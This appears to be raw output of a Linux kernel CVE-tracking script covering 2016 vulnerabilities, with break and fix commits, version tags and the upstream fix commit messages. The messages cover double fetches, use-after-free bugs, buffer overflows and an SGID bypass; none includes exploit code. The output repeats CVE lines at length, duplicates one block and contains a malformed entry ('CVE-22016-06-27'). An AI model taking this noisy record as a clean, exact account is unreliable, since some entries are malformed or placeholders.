The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6198
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-05-10
Linus Commit: 9409e22acdfc9153f88d9b1ed2bd2a5b34d2d3ca
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6327:
CVE-2016-6327:
51093254bf879bc9ce96590400a87897c7498463:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 51093254bf879bc9ce96590400a87897c7498463
Author: Bart Van Assche <bart.vanassche@sandisk.com>
Date:   Thu Feb 11 11:03:09 2016 -0800

    IB/srpt: Simplify srpt_handle_tsk_mgmt()
    
    Let the target core check task existence instead of the SRP target
    driver. Additionally, let the target core check the validity of the
    task management request instead of the ib_srpt driver.
    
    This patch fixes the following kernel crash:
    
    BUG: unable to handle kernel NULL pointer dereference at 0000000000000001
    IP: [<ffffffffa0565f37>] srpt_handle_new_iu+0x6d7/0x790 [ib_srpt]
    Oops: 0002 [#1] SMP
    Call Trace:
     [<ffffffffa05660ce>] srpt_process_completion+0xde/0x570 [ib_srpt]
     [<ffffffffa056669f>] srpt_compl_thread+0x13f/0x160 [ib_srpt]
     [<ffffffff8109726f>] kthread+0xcf/0xe0
     [<ffffffff81613cfc>] ret_from_fork+0x7c/0xb0
    
    Signed-off-by: Bart Van Assche <bart.vanassche@sandisk.com>
    Fixes: 3e4f574857ee ("ib_srpt: Convert TMR path to target_submit_tmr")
    Tested-by: Alex Estrin <alex.estrin@intel.com>
    Reviewed-by: Christoph Hellwig <hch@lst.de>
    Cc: Nicholas Bellinger <nab@linux-iscsi.org>
    Cc: Sagi Grimberg <sagig@mellanox.com>
    Cc: stable <stable@vger.kernel.org>
    Signed-off-by: Doug Ledford <dledford@redhat.com>

 drivers/infiniband/ulp/srpt/ib_srpt.c |   59 +--------------------------------
 1 file changed, 1 insertion(+), 58 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-6327
Break Date: 2012-11-28
Break Commit: 3e4f574857eebce60bb56d7524f3f9eaa2a126d0
Break Tag: 3.8
Linus Fix Date: 2016-02-29
Linus Commit: 51093254bf879bc9ce96590400a87897c7498463
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.78.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit fa00c437eef8dc2e7b25f8cd868cfa405fcc2bb3
Author: Dave Carroll <david.carroll@microsemi.com>
Date:   Fri Aug 5 13:44:10 2016 -0600

    aacraid: Check size values after double-fetch from user
    
    In aacraid's ioctl_send_fib() we do two fetches from userspace, one the
    get the fib header's size and one for the fib itself. Later we use the
    size field from the second fetch to further process the fib. If for some
    reason the size from the second fetch is different than from the first
    fix, we may encounter an out-of- bounds access in aac_fib_send(). We
    also check the sender size to insure it is not out of bounds. This was
    reported in https://bugzilla.kernel.org/show_bug.cgi?id=116751 and was
    assigned CVE-2016-6480.
    
    Reported-by: Pengfei Wang <wpengfeinudt@gmail.com>
    Fixes: 7c00ffa31 '[SCSI] 2.6 aacraid: Variable FIB size (updated patch)'
    Cc: stable@vger.kernel.org
    Signed-off-by: Dave Carroll <david.carroll@microsemi.com>
    Reviewed-by: Johannes Thumshirn <jthumshirn@suse.de>
    Signed-off-by: Martin K. Petersen <martin.petersen@oracle.com>

 drivers/scsi/aacraid/commctrl.c |   13 +++++++++++--
 1 file changed, 11 insertions(+), 2 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6480
Break Date: 2005-05-20
Break Commit: 7c00ffa314bf0fb0e23858bbebad33b48b6abbb9
Break Tag: 2.6
Linus Fix Date: 2016-08-08
Linus Commit: fa00c437eef8dc2e7b25f8cd868cfa405fcc2bb3
Linus Tag: 4.8
Stable Date: 2016-09-07
Stable Commit: 67d4aa44188d0da7f661972a88f9ac448e4fd2fe
Stable Tag: 3.14.78

CVE-2016-6516:
54dbc15172375641ef03399e8f911d7165eb90fb:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 10eec60ce79187686e052092e5383c99b4420a20
Author: Scott Bauer <sbauer@plzdonthack.me>
Date:   Wed Jul 27 19:11:29 2016 -0600

    vfs: ioctl: prevent double-fetch in dedupe ioctl
    
    This prevents a double-fetch from user space that can lead to to an
    undersized allocation and heap overflow.
    
    Fixes: 54dbc1517237 ("vfs: hoist the btrfs deduplication ioctl to the vfs")
    Signed-off-by: Scott Bauer <sbauer@plzdonthack.me>
    Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

 fs/ioctl.c |    1 +
 1 file changed, 1 insertion(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6516
Break Date: 2016-01-01
Break Commit: 54dbc15172375641ef03399e8f911d7165eb90fb
Break Tag: 4.5
Linus Fix Date: 2016-07-28
Linus Commit: 10eec60ce79187686e052092e5383c99b4420a20
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6828:
CVE-2016-6828:
2.6:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
6859d49475d4f32abe640372117e4b687906e6b6:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
2.6:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit bb1fceca22492109be12640d49f5ea5a544c6bb4
Author: Eric Dumazet <edumazet@google.com>
Date:   Wed Aug 17 05:56:26 2016 -0700

    tcp: fix use after free in tcp_xmit_retransmit_queue()
    
    When tcp_sendmsg() allocates a fresh and empty skb, it puts it at the
    tail of the write queue using tcp_add_write_queue_tail()
    
    Then it attempts to copy user data into this fresh skb.
    
    If the copy fails, we undo the work and remove the fresh skb.
    
    Unfortunately, this undo lacks the change done to tp->highest_sack and
    we can leave a dangling pointer (to a freed skb)
    
    Later, tcp_xmit_retransmit_queue() can dereference this pointer and
    access freed memory. For regular kernels where memory is not unmapped,
    this might cause SACK bugs because tcp_highest_sack_seq() is buggy,
    returning garbage instead of tp->snd_nxt, but with various debug
    features like CONFIG_DEBUG_PAGEALLOC, this can crash the kernel.
    
    This bug was found by Marco Grassi thanks to syzkaller.
    
    Fixes: 6859d49475d4 ("[TCP]: Abstract tp->highest_sack accessing & point to next skb")
    Reported-by: Marco Grassi <marco.gra@gmail.com>
    Signed-off-by: Eric Dumazet <edumazet@google.com>
    Cc: Ilpo Jrvinen <ilpo.jarvinen@helsinki.fi>
    Cc: Yuchung Cheng <ycheng@google.com>
    Cc: Neal Cardwell <ncardwell@google.com>
    Acked-by: Neal Cardwell <ncardwell@google.com>
    Reviewed-by: Cong Wang <xiyou.wangcong@gmail.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 include/net/tcp.h |    2 ++
 1 file changed, 2 insertions(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-6828
Break Date: 2008-01-28
Break Commit: 6859d49475d4f32abe640372117e4b687906e6b6
Break Tag: 2.6
Linus Fix Date: 2016-08-18
Linus Commit: bb1fceca22492109be12640d49f5ea5a544c6bb4
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
4.2:
-:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7039
Break Date: 2015-01-02
Break Commit: 9b174d88c257150562b0101fcc6cb6c3cb74275c
Break Tag: 4.0
Linus Fix Date: -
Linus Commit: local-2016-7039
Linus Tag: -
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
4.2:
-:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7039
Break Date: 2015-01-02
Break Commit: 9b174d88c257150562b0101fcc6cb6c3cb74275c
Break Tag: 4.0
Linus Fix Date: -
Linus Commit: local-2016-7039
Linus Tag: -
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7042
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: -
Linus Commit: local-2016-7042
Linus Tag: -
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7097:
CVE-2016-7097:
-:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 073931017b49d9458aa351605b43a7e34598caef
Author: Jan Kara <jack@suse.cz>
Date:   Mon Sep 19 17:39:09 2016 +0200

    posix_acl: Clear SGID bit when setting file permissions
    
    When file permissions are modified via chmod(2) and the user is not in
    the owning group or capable of CAP_FSETID, the setgid bit is cleared in
    inode_change_ok().  Setting a POSIX ACL via setxattr(2) sets the file
    permissions as well as the new ACL, but doesn't clear the setgid bit in
    a similar way; this allows to bypass the check in chmod(2).  Fix that.
    
    References: CVE-2016-7097
    Reviewed-by: Christoph Hellwig <hch@lst.de>
    Reviewed-by: Jeff Layton <jlayton@redhat.com>
    Signed-off-by: Jan Kara <jack@suse.cz>
    Signed-off-by: Andreas Gruenbacher <agruenba@redhat.com>

 fs/9p/acl.c               |   40 +++++++++++++++++-----------------------
 fs/btrfs/acl.c            |    6 ++----
 fs/ceph/acl.c             |    6 ++----
 fs/ext2/acl.c             |   12 ++++--------
 fs/ext4/acl.c             |   12 ++++--------
 fs/f2fs/acl.c             |    6 ++----
 fs/gfs2/acl.c             |   12 +++---------
 fs/hfsplus/posix_acl.c    |    4 ++--
 fs/jffs2/acl.c            |    9 ++++-----
 fs/jfs/acl.c              |    6 ++----
 fs/ocfs2/acl.c            |   10 ++++------
 fs/orangefs/acl.c         |   15 +++++----------
 fs/posix_acl.c            |   31 +++++++++++++++++++++++++++++++
 fs/reiserfs/xattr_acl.c   |    8 ++------
 fs/xfs/xfs_acl.c          |   13 ++++---------
 include/linux/posix_acl.h |    1 +
 16 files changed, 89 insertions(+), 102 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7097
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-09-22
Linus Commit: 073931017b49d9458aa351605b43a7e34598caef
Linus Tag: 4.9
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7117:
2.6:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-22016-06-27:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.67.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 34b88a68f26a75e4fded796f1a49c40f82234b7d
Author: Arnaldo Carvalho de Melo <acme@redhat.com>
Date:   Mon Mar 14 09:56:35 2016 -0300

    net: Fix use after free in the recvmmsg exit path
    
    The syzkaller fuzzer hit the following use-after-free:
    
      Call Trace:
       [<ffffffff8175ea0e>] __asan_report_load8_noabort+0x3e/0x40 mm/kasan/report.c:295
       [<ffffffff851cc31a>] __sys_recvmmsg+0x6fa/0x7f0 net/socket.c:2261
       [<     inline     >] SYSC_recvmmsg net/socket.c:2281
       [<ffffffff851cc57f>] SyS_recvmmsg+0x16f/0x180 net/socket.c:2270
       [<ffffffff86332bb6>] entry_SYSCALL_64_fastpath+0x16/0x7a
      arch/x86/entry/entry_64.S:185
    
    And, as Dmitry rightly assessed, that is because we can drop the
    reference and then touch it when the underlying recvmsg calls return
    some packets and then hit an error, which will make recvmmsg to set
    sock->sk->sk_err, oops, fix it.
    
    Reported-and-Tested-by: Dmitry Vyukov <dvyukov@google.com>
    Cc: Alexander Potapenko <glider@google.com>
    Cc: Eric Dumazet <edumazet@google.com>
    Cc: Kostya Serebryany <kcc@google.com>
    Cc: Sasha Levin <sasha.levin@oracle.com>
    Fixes: a2e2725541fa ("net: Introduce recvmmsg socket syscall")
    http://lkml.kernel.org/r/20160122211644.GC2470@redhat.com
    Signed-off-by: Arnaldo Carvalho de Melo <acme@redhat.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 net/socket.c |   38 +++++++++++++++++++-------------------
 1 file changed, 19 insertions(+), 19 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-10
CVE: CVE-2016-7117
Break Date: 2009-10-12
Break Commit: a2e2725541fad72416326798c2d7fa4dafb7d337
Break Tag: 2.6
Linus Fix Date: 2016-03-14
Linus Commit: 34b88a68f26a75e4fded796f1a49c40f82234b7d
Linus Tag: 4.6
Stable Date: 2016-04-20
Stable Commit: 902b916d00ba73095b58a9a8dfe926c6a7f635d5
Stable Tag: 3.14.67

CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 7bc2b55a5c030685b399bb65b6baa9ccc3d1f167
Author: Dan Carpenter <dan.carpenter@oracle.com>
Date:   Thu Sep 15 16:44:56 2016 +0300

    scsi: arcmsr: Buffer overflow in arcmsr_iop_message_xfer()
    
    We need to put an upper bound on "user_len" so the memcpy() doesn't
    overflow.
    
    Cc: <stable@vger.kernel.org>
    Reported-by: Marco Grassi <marco.gra@gmail.com>
    Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com>
    Reviewed-by: Tomas Henzl <thenzl@redhat.com>
    Signed-off-by: Martin K. Petersen <martin.petersen@oracle.com>

 drivers/scsi/arcmsr/arcmsr_hba.c |    8 +++++++-
 1 file changed, 7 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7425
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-09-15
Linus Commit: 7bc2b55a5c030685b399bb65b6baa9ccc3d1f167
Linus Tag: 4.9
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
2012-09-28:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit ded89912156b1a47d940a0c954c43afbabd0c42c
Author: Arend Van Spriel <arend.vanspriel@broadcom.com>
Date:   Mon Sep 5 10:45:47 2016 +0100

    brcmfmac: avoid potential stack overflow in brcmf_cfg80211_start_ap()
    
    User-space can choose to omit NL80211_ATTR_SSID and only provide raw
    IE TLV data. When doing so it can provide SSID IE with length exceeding
    the allowed size. The driver further processes this IE copying it
    into a local variable without checking the length. Hence stack can be
    corrupted and used as exploit.
    
    Cc: stable@vger.kernel.org # v4.7
    Reported-by: Daxing Guo <freener.gdx@gmail.com>
    Reviewed-by: Hante Meuleman <hante.meuleman@broadcom.com>
    Reviewed-by: Pieter-Paul Giesberts <pieter-paul.giesberts@broadcom.com>
    Reviewed-by: Franky Lin <franky.lin@broadcom.com>
    Signed-off-by: Arend van Spriel <arend.vanspriel@broadcom.com>
    Signed-off-by: Kalle Valo <kvalo@codeaurora.org>

 .../broadcom/brcm80211/brcmfmac/cfg80211.c         |    2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-8658
Break Date: 2012-09-28
Break Commit: 1a87334239757b69eb9885979c32bbf871b3ec88
Break Tag: 3.7
Linus Fix Date: 2016-09-07
Linus Commit: ded89912156b1a47d940a0c954c43afbabd0c42c
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit fac8e0f579695a3ecbc4d3cac369139d7f819971
Author: Jesse Gross <jesse@kernel.org>
Date:   Sat Mar 19 09:32:01 2016 -0700

    tunnels: Don't apply GRO to multiple layers of encapsulation.
    
    When drivers express support for TSO of encapsulated packets, they
    only mean that they can do it for one layer of encapsulation.
    Supporting additional levels would mean updating, at a minimum,
    more IP length fields and they are unaware of this.
    
    No encapsulation device expresses support for handling offloaded
    encapsulated packets, so we won't generate these types of frames
    in the transmit path. However, GRO doesn't have a check for
    multiple levels of encapsulation and will attempt to build them.
    
    UDP tunnel GRO actually does prevent this situation but it only
    handles multiple UDP tunnels stacked on top of each other. This
    generalizes that solution to prevent any kind of tunnel stacking
    that would cause problems.
    
    Fixes: bf5a755f ("net-gre-gro: Add GRE support to the GRO stack")
    Signed-off-by: Jesse Gross <jesse@kernel.org>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 include/linux/netdevice.h |    4 ++--
 net/core/dev.c            |    2 +-
 net/ipv4/af_inet.c        |   15 ++++++++++++++-
 net/ipv4/gre_offload.c    |    5 +++++
 net/ipv4/udp_offload.c    |    6 +++---
 net/ipv6/ip6_offload.c    |   15 ++++++++++++++-
 6 files changed, 39 insertions(+), 8 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-8666
Break Date: 2014-01-07
Break Commit: bf5a755f5e9186406bbf50f4087100af5bd68e40
Break Tag: 3.14
Linus Fix Date: 2016-03-20
Linus Commit: fac8e0f579695a3ecbc4d3cac369139d7f819971
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

2016-09-11:
2016-09-11:
2016-09-11:
2016-09-11:
2016-09-11:
2016-09-11:
2016-09-11:
2016-09-11:
CVE-2013-4312:
CVE-2013-7421:
CVE-2013-7421:
CVE-2013-7446:
CVE-2014-0155:
CVE-2014-0181:
CVE-2014-0196:
CVE-2014-0206:
CVE-2014-1737:
CVE-2014-1738:
CVE-2014-1739:
CVE-2014-2580:
CVE-2014-2678:
CVE-2014-2739:
CVE-2014-2851:
CVE-2014-3122:
CVE-2014-3144:
CVE-2014-3145:
CVE-2014-3153:
CVE-2014-3153:
CVE-2014-3153:
CVE-2014-3153:
CVE-2014-3181:
CVE-2014-3182:
CVE-2014-3183:
CVE-2014-3184:
CVE-2014-3185:
CVE-2014-3186:
CVE-2014-3534:
CVE-2014-3601:
CVE-2014-3610:
CVE-2014-3611:
CVE-2014-3631:
CVE-2014-3646:
CVE-2014-3647:
CVE-2014-3647:
CVE-2014-3673:
CVE-2014-3687:
CVE-2014-3688:
CVE-2014-3690:
CVE-2014-3917:
CVE-2014-3940:
CVE-2014-4014:
CVE-2014-4157:
CVE-2014-4171:
CVE-2014-4171:
CVE-2014-4171:
CVE-2014-4508:
CVE-2014-4608:
CVE-2014-4608:
CVE-2014-4611:
CVE-2014-4652:
CVE-2014-4653:
CVE-2014-4654:
CVE-2014-4655:
CVE-2014-4656:
CVE-2014-4656:
CVE-2014-4667:
CVE-2014-4699:
CVE-2014-4943:
CVE-2014-5045:
CVE-2014-5077:
CVE-2014-5206:
CVE-2014-5206:
CVE-2014-5207:
CVE-2014-5207:
CVE-2014-5471:
CVE-2014-5472:
CVE-2014-6410:
CVE-2014-6416:
CVE-2014-6417:
CVE-2014-6418:
CVE-2014-7145:
CVE-2014-7283:
CVE-2014-7284:
CVE-2014-7822:
CVE-2014-7825:
CVE-2014-7826:
CVE-2014-7841:
CVE-2014-7842:
CVE-2014-7843:
CVE-2014-7970:
CVE-2014-7975:
CVE-2014-8086:
CVE-2014-8133:
CVE-2014-8134:
CVE-2014-8159:
CVE-2014-8160:
CVE-2014-8369:
CVE-2014-8480:
CVE-2014-8480:
CVE-2014-8481:
CVE-2014-8559:
CVE-2014-8559:
CVE-2014-8884:
CVE-2014-8989:
CVE-2014-8989:
CVE-2014-8989:
CVE-2014-8989:
CVE-2014-9090:
CVE-2014-9322:
CVE-2014-9322:
CVE-2014-9419:
CVE-2014-9420:
CVE-2014-9428:
CVE-2014-9529:
CVE-2014-9584:
CVE-2014-9585:
CVE-2014-9644:
CVE-2014-9683:
CVE-2014-9710:
CVE-2014-9715:
CVE-2014-9717:
CVE-2014-9728:
CVE-2014-9728:
CVE-2014-9728:
CVE-2014-9729:
CVE-2014-9730:
CVE-2014-9731:
CVE-2014-9803:
CVE-2014-9904:
CVE-2015-0239:
CVE-2015-0272:
CVE-2015-0274:
CVE-2015-0275:
CVE-2015-1328:
